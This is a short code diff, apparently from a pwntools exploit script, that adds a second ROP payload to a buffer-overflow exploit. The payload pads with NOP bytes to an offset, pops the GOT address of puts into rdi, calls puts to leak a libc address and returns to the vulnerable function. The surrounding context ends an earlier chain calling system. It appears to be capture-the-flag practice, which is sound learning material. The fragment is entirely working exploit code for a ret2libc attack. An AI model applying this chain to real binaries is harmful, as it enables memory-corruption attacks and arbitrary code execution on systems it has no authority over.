@@ -26,3 +26,12 @@ p64(system),
 p64(ret)
 
 ])
+
+payload = flat([
+    offset*b"\x90",
+    pop_rdi,
+    e.got.puts,
+    e.plt.puts,
+    e.symbols.vuln,
+
+])
